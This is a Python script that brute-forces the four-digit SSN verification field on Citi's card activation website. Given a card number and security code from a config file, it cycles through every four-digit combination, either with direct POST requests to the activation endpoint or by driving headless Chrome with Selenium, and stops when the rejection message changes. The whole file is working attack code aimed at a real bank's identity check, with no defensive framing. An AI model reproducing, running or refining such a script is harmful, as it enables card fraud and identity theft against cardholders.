import requests
import config
import time
from permute import permute
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

HOME_URL = 'https://www.cardactivation.citi.com'
CONTINUE_URL = 'https://www.cardactivation.citi.com/Home/Continue1'
POSSIBLE_PIN_DIGITS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
PIN_DIGIT_COUNT = 4
WAIT_DELAY = 5

card_number = config.card_number
security_code = config.security_code

possible_pins = permute(POSSIBLE_PIN_DIGITS, PIN_DIGIT_COUNT)


def post_request_brute_force(possible_pins, card_number, security_code, url):
    for pin in possible_pins:
        request_payload = {
            'cardNumber': card_number,
            'securityCode': security_code,
            'ssn': pin
        }

        continue_response = requests.post(CONTINUE_URL, json=request_payload)
        continue_response_payload = continue_response.json()
        status_code = continue_response_payload['Status']
        msg = continue_response_payload['Msg']

        print(continue_response_payload)
        print(pin)

        if status_code != '999' or msg != 'The information you entered does not match our records. Please try again or contact Citi Customer Service at the number on the activation sticker or on the back of your card.':
            return


def selenium_brute_force(possible_pins, card_number, security_code, url, wait_delay):
    for pin in possible_pins:
        options = Options()
        options.headless = True
        driver = webdriver.Chrome(
            executable_path='chromedriver.exe', options=options)
        driver.get(url)

        card_number_input = driver.find_element_by_id('ipCardNumber')
        card_number_input.send_keys(card_number)

        security_code_input = driver.find_element_by_id('ipSecurityCode')
        security_code_input.send_keys(security_code)

        pin_input = driver.find_element_by_id('ipSSN')
        pin_input.send_keys(pin)

        continue_btn = driver.find_element_by_id('continue1')
        continue_btn.click()

        time.sleep(wait_delay)

        try:
            temp_message = driver.find_element_by_id('tempMessage')
            temp_message_text = driver.execute_script(
                "return arguments[0].innerText;", temp_message)

            if temp_message_text is None:
                print('match ' + pin)
                return

            print(temp_message_text)
            driver.close()

        except Exception:
            print('exception ' + pin)
            return


selenium_brute_force(possible_pins, card_number,
                     security_code, HOME_URL, WAIT_DELAY)
